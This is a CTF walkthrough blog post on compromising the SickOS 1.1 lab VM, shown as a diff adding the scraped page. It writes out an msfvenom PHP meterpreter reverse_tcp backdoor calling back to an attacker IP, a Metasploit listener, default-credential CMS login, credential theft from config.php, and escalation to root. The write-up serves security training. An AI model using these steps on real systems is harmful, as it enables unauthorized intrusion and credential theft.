@@ -1,0 +1,307 @@
+
+								
+																		Hack the SickOS 1.1 VM (CTF Challenge)
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on October 12, 2016
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									This time we are going to crack SickOS 1.1 in the Boot2root challenges. This CTF gives a clear analogy of how hacking strategies can be performed on a network to compromise it in a safe environment. The objective being to compromise the network/machine and gain Administrative/root privileges on them.
+Breaching Methodology:
+
+Network Scanning (Netdiscover, Nmap)
+Configure browser proxy
+Use robot.txt
+Search Wolf CMS admin login page &amp; default credential (Google)
+Enter into the admin console
+Generate PHP Backdoor (Msfvenom)
+Upload and execute a backdoor
+Reverse connection (Metasploit)
+Steal password from inside config.php
+Get into the shell for privilege escalation
+Import python one-liner for proper TTY shell
+Open etc/passwd
+Switch user (su) and submit the stolen password
+Take root access
+
+We will start off by finding the target.
+
+		
+		
+			
+			
+			
+			
+netdiscover
+			
+				
+					
+				
+					1
+				
+						netdiscover
+					
+				
+			
+		
+
+
+Our target IP is 192.168.1.101. Now we scan the IP by Nmap.
+
+		
+		
+			
+			
+			
+			
+nmap -p- -A 192.168.1.101
+			
+				
+					
+				
+					1
+				
+						nmap -p- -A 192.168.1.101
+					
+				
+			
+		
+
+
+If you had have observed during nmap that there was something about proxy on 3128. So we will try and set up a manual proxy. Give the IP of the VM in the HTTP Proxy and the port 3128
+‘
+Generally, there are always some chances of getting robots.txt file inside the web directory, therefore, while penetrating any system we should always check for the robots.txt file. Here also it works and it tells us something about /wolfcms that means this website is made in Wolf CMS or there is a directory with the name of /wolfcms. 
+
+Then open it in the browser as the link: 192.168.1.101/wolfcms/ and the page will open as below indicating that it has been made in Wolf CMS.
+
+I don’t know much about Wolf CMS so I searched Google to know where admin page resides. As I found the login page through Google, I opened it. And it was asking me for username and password. By default, the username and password is admin and admin respectively and I logged into the admin console, after that, select files tab and then select upload files option.
+
+Here, we need to upload the malicious file and to generate it open your terminal in kali and type:
+
+		
+		
+			
+			
+			
+			
+msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.108 lport=4444 –f raw
+			
+				
+					
+				
+					1
+				
+						msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.108 lport=4444 –f raw
+					
+				
+			
+		
+
+On the other hand run multi/handler inside Metasploit framework.
+
+Copy the code from &lt;?php to die(); and paste it to a text file with the extension .php. Upload the said file.
+
+As we can see, the PHP backdoor has been uploaded inside /public directory.
+
+So now we need to execute shell.php file for getting the reverse connection on Metasploit.
+
+Meanwhile, return to the Metasploit terminal and wait for the meterpreter session by exploiting multi handler.
+
+		
+		
+			
+			
+			
+			
+msf use exploit/multi/handler
+msf exploit(multi/handler) set payload php/meterpreter/reverse_tcp
+msf exploit(multi/handler) set lhost 192.168.1.108
+msf exploit(multi/handler) set lport 4444
+msf exploit(multi/handler) exploit
+			
+				
+					
+				
+					12345
+				
+						msf use exploit/multi/handlermsf exploit(multi/handler) set payload php/meterpreter/reverse_tcpmsf exploit(multi/handler) set lhost 192.168.1.108msf exploit(multi/handler) set lport 4444msf exploit(multi/handler) exploit
+					
+				
+			
+		
+
+From given below image you can observe meterpreter session 1, now start penetrating for accessing root privilege. We have access /var/www/wolfcms where we found the config.php file. So when had opened config.php file it has shown DB username and password.
+
+Then to access proper TTY shell we had import python one line script by typing following:
+
+		
+		
+			
+			
+			
+			
+python -c 'import pty;pty.spawn("/bin/bash")'
+			
+				
+					
+				
+					1
+				
+						python -c 'import pty;pty.spawn("/bin/bash")'
+					
+				
+			
+		
+
+Moving further read the password file and to do so type:
+
+		
+		
+			
+			
+			
+			
+cat etc/password
+			
+				
+					
+				
+					1
+				
+						cat etc/password
+					
+				
+			
+		
+
+Observe all the user details it gives us and you will find that user sickos have the value of 1000:1000 that means that this is the first user. So, we might find odour here as it is the first user. Therefore, switch the user to sickos with the password [email protected] that we found.
+
+		
+		
+			
+			
+			
+			
+su sickos
+sudo -s
+			
+				
+					
+				
+					12
+				
+						su sickossudo -s
+					
+				
+			
+		
+
+Furthermore, we need to go into /root to look for the flag so for that run the set of following commands:
+
+		
+		
+			
+			
+			
+			
+cd /root
+ls
+			
+				
+					
+				
+					12
+				
+						cd /rootls
+					
+				
+			
+		
+
+Here, you will find a text find. Let’s read it.
+HUUURRRRAYYY!!! We have successfully completed this challenge.
+
+Author: Yashika Dhir is a passionate Researcher and Technical Writer at Hacking Articles. She is a hacking enthusiast. contact here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
